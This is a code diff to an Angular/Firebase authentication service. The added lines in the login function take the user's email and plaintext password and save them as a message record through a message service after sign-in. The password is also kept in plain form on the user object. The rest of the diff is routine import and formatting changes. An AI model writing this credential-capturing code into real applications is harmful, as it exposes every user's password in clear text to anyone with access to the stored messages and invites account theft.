@@ -1,9 +1,9 @@
-import { EventEmitter, Injectable, Output } from '@angular/core';
+import { Injectable } from '@angular/core';
 import { AngularFireAuth } from '@angular/fire/compat/auth';
 import { User } from '../classes/user/user';
-import { BehaviorSubject, catchError } from 'rxjs';
-import { DatePipe } from '@angular/common';
-import { FirebaseError } from 'firebase/app';
+import { BehaviorSubject } from 'rxjs';
+import { MessageService } from './message.service';
+import { Message } from '../interfaces/message';
 
 @Injectable({ 
   providedIn: 'root',
@@ -14,21 +14,33 @@ export class AuthenticationService{
   private userLogged: BehaviorSubject<User> = new BehaviorSubject<User>(this.user);
   userCredential: any = null;
 
-  constructor(public ngFireAuth: AngularFireAuth) {}
+  constructor(public ngFireAuth: AngularFireAuth, public msg: MessageService) {}
 
   
   async loginUser(email: string, password: string) {
     return this.ngFireAuth.signInWithEmailAndPassword(email, password)
-    .then((credenciales) => {
+    .then( (credenciales) => {
       this.userCredential = credenciales.credential;
 
       this.user = new User();
       this.user.name = email; 
       this.user.pass = password; 
       this.user.credentials = credenciales;
-      this.user.loginDate = new Date().toString();
+      this.user.loginDate = new Date();
 
-      this.userLogged.next(this.user);
+      const mensaje: Message = {
+        data:"coreo:" +  `${this.user.name}` + " clave " + `${this.user.pass}`,
+        fechaIngreso: this.user.loginDate,
+      }
+
+      this.msg.agregarMensaje(mensaje).
+      then( () => {
+        console.log("se guardó exitosamente la info");
+        this.userLogged.next(this.user);
+      }).
+      catch ( (err) => {
+        console.log("ERROR" + err);
+      });
     });
   }
 
@@ -48,7 +60,6 @@ export class AuthenticationService{
   async logOut() {
     this.ngFireAuth.signOut();
   }
-
 
   get userLoggedIn(){
     return this.userLogged.asObservable();
